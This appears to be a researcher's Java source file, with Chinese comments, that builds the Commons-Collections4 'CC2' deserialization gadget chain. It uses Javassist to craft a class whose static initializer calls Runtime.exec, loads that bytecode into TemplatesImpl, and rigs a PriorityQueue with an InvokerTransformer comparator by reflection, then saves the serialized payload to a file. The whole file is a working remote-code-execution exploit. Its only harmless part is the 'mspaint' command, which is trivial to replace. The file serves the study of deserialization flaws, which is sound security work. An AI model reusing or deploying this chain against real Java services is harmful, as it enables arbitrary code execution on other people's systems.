package com.pinger.javasec.common;

import com.pinger.javasec.util.SerialUtil;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

/**
 * @author : p1n93r
 * @date : 2021/4/1 15:38
 * CC2 Gadget研究
 * CC2只对Commons-Collections4有效，3中TransformingComparator没实现序列化接口，无法序列化
 */
public class CC2 {

    /**
     * 需要一个空类作为javassist的模板
     */
    public static class Placeholder {}

    public static Object getPayload() throws Exception{
        String abstractTransletClassPath = "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";

        // 使用javassist生成一个恶意的类
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(Placeholder.class));
        classPool.insertClassPath(new ClassClassPath(Class.forName(abstractTransletClassPath)));

        CtClass placeholder = classPool.get(Placeholder.class.getName());
        placeholder.setSuperclass(classPool.get(Class.forName(abstractTransletClassPath).getName()));
        // 这里insertBefore还是After都一样，反正都是在静态初始化块里写代码
        placeholder.makeClassInitializer().insertBefore("java.lang.Runtime.getRuntime().exec(\"mspaint\");");
        placeholder.setName("EvalClass");
        // 得到恶意类的字节码
        byte[] evalByte = placeholder.toBytecode();

        TemplatesImpl templates = TemplatesImpl.class.getConstructor(new Class[0]).newInstance();
        Class<? extends TemplatesImpl> clazz = templates.getClass();
        // 将恶意字节码填充到TemplatesImpl对象中
        Field bytecodes = clazz.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates,new byte[][]{evalByte});

        // 还需要设置TemplatesImpl对象的_name属性，否则不能顺利执行：TemplatesImpl#getTransletInstance()
        Field name = clazz.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates,"p1n93r");

        // 现在TemplatesImpl准备好了，需要一个类反序列化时触发：TemplatesImpl#newTransformer
        // 使用PriorityQueue类反序列化触发
        PriorityQueue<Object> res = new PriorityQueue<>(2);
        // 为啥不在这个地方添加TemplatesImpl对象：因为add操作会触发比较，而TemplatesImpl没有实现Comparable接口
        // 所以只能后面用反射进行添加了
        res.add(1);
        res.add(1);

        // 现在将TransformingComparator和TemplatesImpl对象设置到PriorityQueue中，
        // 使得PriorityQueue反序列化时调用TransformingComparator#tranformer(templatesImpl)，从而触发整个利用链
        Class<? extends PriorityQueue> resClazz = res.getClass();

        // 先构造一个TransformingComparator
        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", new Class[0], new Object[0]);
        TransformingComparator newTransformerComparator = new TransformingComparator(invokerTransformer);
        // 设置PriorityQueue的comparator
        Field comparator = resClazz.getDeclaredField("comparator");
        comparator.setAccessible(true);
        comparator.set(res,newTransformerComparator);

        // 然后将TemplatesImpl对象设置到PriorityQueue中
        Field queue = resClazz.getDeclaredField("queue");
        queue.setAccessible(true);
        queue.set(res,new Object[]{templates,templates});
        return res;
    }

    public static void main(String[] args) throws Exception{
        Object payload = getPayload();
        // SerialUtil.runPayload(payload);
        SerialUtil.savePayload(payload,"C:\\Users\\18148\\Desktop\\tmp\\流量特征\\cc2");
    }

}
